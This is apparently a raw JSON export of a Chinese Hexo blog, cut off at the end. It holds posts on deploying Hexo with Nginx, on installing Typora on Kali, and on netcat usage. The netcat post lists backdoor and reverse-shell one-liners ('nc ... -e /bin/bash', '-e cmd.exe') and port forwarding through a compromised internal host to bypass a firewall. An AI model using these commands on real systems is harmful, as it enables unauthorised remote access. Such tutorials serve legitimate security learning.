start=\"4\">\n<li>创建软连接</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /opt/nodejs/bin/node /usr/local/bin/node</span><br><span class=\"line\">ln -s /opt/nodejs/bin/npm  /usr/local/bin/npm</span><br><span class=\"line\"></span><br><span class=\"line\"># 验证</span><br><span class=\"line\">node -v</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"五、hexo-部署\"><a href=\"#五、hexo-部署\" class=\"headerlink\" title=\"五、hexo 部署\"></a>五、hexo 部署</h3><ol>\n<li>安装hexo</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g </span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>采用软连接的方式将hexo添加入全局变量</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>将自己GitHub中存储的hexo博客ssh下载到主机中</li>\n</ol>\n<h3 id=\"六、使用Nginx部署Hexo站点\"><a href=\"#六、使用Nginx部署Hexo站点\" class=\"headerlink\" title=\"六、使用Nginx部署Hexo站点\"></a>六、使用Nginx部署Hexo站点</h3><ol>\n<li>Nginx安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>配置Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -t</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>使用vim打开nginx.conf文件</li>\n</ol>\n<ul>\n<li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://imgchr.com/i/s6S4k8\"><img src=\"https://s3.ax1x.com/2021/01/18/s6S4k8.png\" alt=\"s6S4k8.png\"></a></p>\n<ol start=\"4\">\n<li>启动Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start nginx.service</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>重启Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"七、配置本地hexo\"><a href=\"#七、配置本地hexo\" class=\"headerlink\" title=\"七、配置本地hexo\"></a>七、配置本地hexo</h3><ul>\n<li>博客根目录_config下增加</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">    type: git  (必须是git)</span><br><span class=\"line\">    repo: root@***(服务器外网ip):#仓库地址</span><br><span class=\"line\">    branch: master   </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>进入自己的hexo博客目录</li>\n<li>hexo clean</li>\n<li>hexo g</li>\n<li>hexo d</li>\n<li>搜索自己的域名便可访问</li>\n</ul>"},{"title":"kali安装typroa","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_8.jpg","top":false,"_content":"\n## kali 安装typora\n\n### 一、安装\n\n- 官网下载文件解压，并移动到 /opt 文件夹下\n\n\n\n### 二、赋权\n\n- 在typora目录的bin文件夹下执行命令\n\n```\n./typora\n```\n\n- 会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.\n\n- 执行命令\n\n```\nsudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox\n```\n\n\n\n### 三、添加快捷方式\n\n- vim typora.desktop\n\n```\n[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png\n```\n\n- 将快捷方式复制到/usr/share/applications\n\n```\nsudo cp typora.desktop /usr/share/applications/\n```\n\n- 关机重启\n","source":"_posts/kali 安装typora.md","raw":"---\ntitle: kali安装typroa\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_8.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: kali\ntags: [kali, typroa]   # 可以是数组\ntop: false\n---\n\n## kali 安装typora\n\n### 一、安装\n\n- 官网下载文件解压，并移动到 /opt 文件夹下\n\n\n\n### 二、赋权\n\n- 在typora目录的bin文件夹下执行命令\n\n```\n./typora\n```\n\n- 会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.\n\n- 执行命令\n\n```\nsudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox\n```\n\n\n\n### 三、添加快捷方式\n\n- vim typora.desktop\n\n```\n[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png\n```\n\n- 将快捷方式复制到/usr/share/applications\n\n```\nsudo cp typora.desktop /usr/share/applications/\n```\n\n- 关机重启\n","slug":"kali 安装typora","published":1,"updated":"2021-06-20T02:55:43.959Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxm000a7vvt0s8w07ar","content":"<h2 id=\"kali-安装typora\"><a href=\"#kali-安装typora\" class=\"headerlink\" title=\"kali 安装typora\"></a>kali 安装typora</h2><h3 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h3><ul>\n<li>官网下载文件解压，并移动到 /opt 文件夹下</li>\n</ul>\n<h3 id=\"二、赋权\"><a href=\"#二、赋权\" class=\"headerlink\" title=\"二、赋权\"></a>二、赋权</h3><ul>\n<li>在typora目录的bin文件夹下执行命令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./typora</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p>\n</li>\n<li><p>执行命令</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chown root chrome-sandbox</span><br><span class=\"line\">sudo chgrp root chrome-sandbox</span><br><span class=\"line\">sudo chmod 4755 chrome-sandbox</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、添加快捷方式\"><a href=\"#三、添加快捷方式\" class=\"headerlink\" title=\"三、添加快捷方式\"></a>三、添加快捷方式</h3><ul>\n<li>vim typora.desktop</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Desktop Entry]</span><br><span class=\"line\">Name=Typora</span><br><span class=\"line\">Exec=/opt/Typora-linux-x64/Typora</span><br><span class=\"line\">Type=Application</span><br><span class=\"line\">Icon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>将快捷方式复制到/usr/share/applications</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cp typora.desktop /usr/share/applications/</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>关机重启</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"kali-安装typora\"><a href=\"#kali-安装typora\" class=\"headerlink\" title=\"kali 安装typora\"></a>kali 安装typora</h2><h3 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h3><ul>\n<li>官网下载文件解压，并移动到 /opt 文件夹下</li>\n</ul>\n<h3 id=\"二、赋权\"><a href=\"#二、赋权\" class=\"headerlink\" title=\"二、赋权\"></a>二、赋权</h3><ul>\n<li>在typora目录的bin文件夹下执行命令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./typora</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p>\n</li>\n<li><p>执行命令</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chown root chrome-sandbox</span><br><span class=\"line\">sudo chgrp root chrome-sandbox</span><br><span class=\"line\">sudo chmod 4755 chrome-sandbox</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、添加快捷方式\"><a href=\"#三、添加快捷方式\" class=\"headerlink\" title=\"三、添加快捷方式\"></a>三、添加快捷方式</h3><ul>\n<li>vim typora.desktop</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Desktop Entry]</span><br><span class=\"line\">Name=Typora</span><br><span class=\"line\">Exec=/opt/Typora-linux-x64/Typora</span><br><span class=\"line\">Type=Application</span><br><span class=\"line\">Icon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>将快捷方式复制到/usr/share/applications</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cp typora.desktop /usr/share/applications/</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>关机重启</li>\n</ul>\n"},{"title":"necat的使用","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_12.jpg","top":false,"_content":"\n## netcat命令选项\n\n#### 本文参考文章链接\n\n[本文参考文章链接1](https://www.fujieace.com/linux/nc-2.html)\n\n[本文参考文章链接2](https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html)\n\n[本文参考文章链接3](https://www.cnblogs.com/lpfuture/p/5719066.html)\n\n<!--more-->\n\n### 常用命令选项\n\n```\n## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态\n```\n\n### 基本全部命令选项\n\n```\n用法：\n\nncat [选项] [主机名] [端口]\n\n \n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n \n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n \n\n-U, --unixsock 仅使用Unix域套接字\n\n\t--vsock 仅使用vsock套接字\n\n \n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec <command> 通过/bin/sh执行给定命令\n\n-e, --exec <command> 执行给定命令\n\n\t--lua-exec <filename> 执行给定的Lua脚本\n\n \n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G <n> 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns <n> 最大<n>同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay <time> 在读/写之间等待时间\n\n-o, --output <filename> 将会话数据转储到文件中\n\n-x, --hex-dump <filename> 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout <time> 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n\t--sctp 使用SCTP代替默认TCP\n\n \n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait <time> 连接超时时间\n\n \n\n-z   零I/O模式，仅报告连接状态\n\n    \n```\n\n\n\n## 1. 模拟聊天\n\n- 服务器\n\n```\nnc -l -p [端口号]\n```\n\n- 客户端\n\n```\nnc [服务器ip] [服务器端口]\n```\n\n\n\n## 2.Banner抓取方法\n\n- Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。\n\n```\necho \"\" | nc -v -n w1 [target_ip] [开始端口-结束端口]\n```\n\n\n\n## 3.文件传输\n\n### 从客户端传输文件到服务器\n\n- 服务器\n\n```\nnc -l -p [端口号] > out_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] < in_flimename\n```\n\n### 从服务器传输文件到客户端\n\n- 服务器\n\n```\nnc -l -p [端口号] < in_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] > out_flimename\n```\n\n\n\n## 4.目录传输（与文件传输类似）\n\n- 服务器\n\n```\ntar -cvf - dir_name | nc -l [port_id]\n```\n\n- 客户端\n\n```\nnc -n [target_ip] [target_port] | tar -xvf - \n```\n\n\n\n##  5. windows建立后门的方法\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e cmd.exe\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e cmd.exe\n```\n\n\n\n## 6、Linux下建立后门\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e /bin/bash\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e /bin/bash\n```\n\n\n\n## 7、连接转发\n\n- 可以解决的问题\n\n1. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。\n\n```\n'''\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n'''\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]\n```\n\n2. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。\n\n```\n## 原理同上\n```\n\n\n\n## 8、反弹shell\n\n[![BFDrmd.md.png](https://s1.ax1x.com/2020/10/22/BFDrmd.md.png)](https://imgchr.com/i/BFDrmd)\n\n\n\n","source":"_posts/netcat.md","raw":"---\ntitle: necat的使用\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_12.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: tool\ntags: [necat, tool]   # 可以是数组\ntop: false\n---\n\n## netcat命令选项\n\n#### 本文参考文章链接\n\n[本文参考文章链接1](https://www.fujieace.com/linux/nc-2.html)\n\n[本文参考文章链接2](https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html)\n\n[本文参考文章链接3](https://www.cnblogs.com/lpfuture/p/5719066.html)\n\n<!--more-->\n\n### 常用命令选项\n\n```\n## 网络模式和代理相关\n-l 监听，作服务器。不填时作客户端。\n-u UDP模式。不填时默认TCP模式。\n-X 和 -x 是代理相关的选项\n\n## 其余常用选项\n-v verbose模式，打印更多日志\n-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性\n-w 超时时间，单位是秒\n-s 指定source addr\n-p 指定source port\n-n 只识别IP地址，不查询DNS\n-k 处理完一个请求之后，继续监听下一个\n-d 脱离命令行窗口，在后台运行，常用于后门建立的过程\n-e 执行某个程序，常用于后门建立的过程\n-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态\n```\n\n### 基本全部命令选项\n\n```\n用法：\n\nncat [选项] [主机名] [端口]\n\n \n\n花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。\n\n \n\n-4    仅使用IPv4\n\n-6    仅使用IPv6\n\n \n\n-U, --unixsock 仅使用Unix域套接字\n\n\t--vsock 仅使用vsock套接字\n\n \n\n-C, --crlf 将CRLF用于EOL序列\n\n-c, --sh-exec <command> 通过/bin/sh执行给定命令\n\n-e, --exec <command> 执行给定命令\n\n\t--lua-exec <filename> 执行给定的Lua脚本\n\n \n\n-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）\n\n-G <n> 松散的源路由跳跃指针（4、8、12，...）\n\n-m, --max-conns <n> 最大<n>同时连接\n\n-h, --help 显示此帮助屏幕\n\n-d, --delay <time> 在读/写之间等待时间\n\n-o, --output <filename> 将会话数据转储到文件中\n\n-x, --hex-dump <filename> 将会话数据以十六进制形式转储到文件中\n\n-i, --idle-timeout <time> 空闲读/写超时时间\n\n-p, --source-port port 指定要使用的源端口\n\n-s, --source addr 指定要使用的源地址（不影响-l）\n\n-l, --listen 绑定并监听传入的连接\n\n-k, --keep-open 在侦听模式下接受多个连接\n\n-n, --nodns 不通过DNS解析主机名\n\n-t, --telnet 回答Telnet协商\n\n-u, --udp 使用UDP代替默认TCP\n\n\t--sctp 使用SCTP代替默认TCP\n\n \n\n-v, --verbose 使用SCTP代替默认TCP\n\n-w, --wait <time> 连接超时时间\n\n \n\n-z   零I/O模式，仅报告连接状态\n\n    \n```\n\n\n\n## 1. 模拟聊天\n\n- 服务器\n\n```\nnc -l -p [端口号]\n```\n\n- 客户端\n\n```\nnc [服务器ip] [服务器端口]\n```\n\n\n\n## 2.Banner抓取方法\n\n- Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。\n\n```\necho \"\" | nc -v -n w1 [target_ip] [开始端口-结束端口]\n```\n\n\n\n## 3.文件传输\n\n### 从客户端传输文件到服务器\n\n- 服务器\n\n```\nnc -l -p [端口号] > out_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] < in_flimename\n```\n\n### 从服务器传输文件到客户端\n\n- 服务器\n\n```\nnc -l -p [端口号] < in_filename\n```\n\n- 客户端\n\n```\nnc [目标IP] [目标端口] > out_flimename\n```\n\n\n\n## 4.目录传输（与文件传输类似）\n\n- 服务器\n\n```\ntar -cvf - dir_name | nc -l [port_id]\n```\n\n- 客户端\n\n```\nnc -n [target_ip] [target_port] | tar -xvf - \n```\n\n\n\n##  5. windows建立后门的方法\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e cmd.exe\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e cmd.exe\n```\n\n\n\n## 6、Linux下建立后门\n\n### 服务器——监听型后门\n\n```\nnc -l -p [port_id] -e /bin/bash\n```\n\n### 客户端——连接型后门\n\n```\nnc [target_ip] [target_port] -e /bin/bash\n```\n\n\n\n## 7、连接转发\n\n- 可以解决的问题\n\n1. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。\n\n```\n'''\n假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B\n'''\n# bat文件中的内容： nc [ip_B] [port_B]\nA: nc -l -p [port_A] -e XX.bat\nB: nc -l -p [port_B] \nC: nc [ip_A] [prt_A]\n```\n\n2. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。\n\n```\n## 原理同上\n```\n\n\n\n## 8、反弹shell\n\n[![BFDrmd.md.png](https://s1.ax1x.com/2020/10/22/BFDrmd.md.png)](https://imgchr.com/i/BFDrmd)\n\n\n\n","slug":"netcat","published":1,"updated":"2021-06-20T03:00:47.621Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxo000d7vvtbgllb4a5","content":"<h2 id=\"netcat命令选项\"><a href=\"#netcat命令选项\" class=\"headerlink\" title=\"netcat命令选项\"></a>netcat命令选项</h2><h4 id=\"本文参考文章链接\"><a href=\"#本文参考文章链接\" class=\"headerlink\" title=\"本文参考文章链接\"></a>本文参考文章链接</h4><p><a href=\"https://www.fujieace.com/linux/nc-2.html\">本文参考文章链接1</a></p>\n<p><a href=\"https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html\">本文参考文章链接2</a></p>\n<p><a href=\"https://www.cnblogs.com/lpfuture/p/5719066.html\">本文参考文章链接3</a></p>\n<span id=\"more\"></span>\n\n<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 网络模式和代理相关</span><br><span class=\"line\">-l 监听，作服务器。不填时作客户端。</span><br><span class=\"line\">-u UDP模式。不填时默认TCP模式。</span><br><span class=\"line\">-X 和 -x 是代理相关的选项</span><br><span class=\"line\"></span><br><span class=\"line\">## 其余常用选项</span><br><span class=\"line\">-v verbose模式，打印更多日志</span><br><span class=\"line\">-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性</span><br><span class=\"line\">-w 超时时间，单位是秒</span><br><span class=\"line\">-s 指定source addr</span><br><span class=\"line\">-p 指定source port</span><br><span class=\"line\">-n 只识别IP地址，不查询DNS</span><br><span class=\"line\">-k 处理完一个请求之后，继续监听下一个</span><br><span class=\"line\">-d 脱离命令行窗口，在后台运行，常用于后门建立的过程</span><br><span class=\"line\">-e 执行某个程序，常用于后门建立的过程</span><br><span class=\"line\">-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本全部命令选项\"><a href=\"#基本全部命令选项\" class=\"headerlink\" title=\"基本全部命令选项\"></a>基本全部命令选项</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用法：</span><br><span class=\"line\"></span><br><span class=\"line\">ncat [选项] [主机名] [端口]</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-4    仅使用IPv4</span><br><span class=\"line\"></span><br><span class=\"line\">-6    仅使用IPv6</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-U, --unixsock 仅使用Unix域套接字</span><br><span class=\"line\"></span><br><span class=\"line\">\t--vsock 仅使用vsock套接字</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-C, --crlf 将CRLF用于EOL序列</span><br><span class=\"line\"></span><br><span class=\"line\">-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令</span><br><span class=\"line\"></span><br><span class=\"line\">-e, --exec &lt;command&gt; 执行给定命令</span><br><span class=\"line\"></span><br><span class=\"line\">\t--lua-exec &lt;filename&gt; 执行给定的Lua脚本</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）</span><br><span class=\"line\"></span><br><span class=\"line\">-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）</span><br><span class=\"line\"></span><br><span class=\"line\">-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接</span><br><span class=\"line\"></span><br><span class=\"line\">-h, --help 显示此帮助屏幕</span><br><span class=\"line\"></span><br><span class=\"line\">-d, --delay &lt;time&gt; 在读/写之间等待时间</span><br><span class=\"line\"></span><br><span class=\"line\">-o, --output &lt;filename&gt; 将会话数据转储到文件中</span><br><span class=\"line\"></span><br><span class=\"line\">-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中</span><br><span 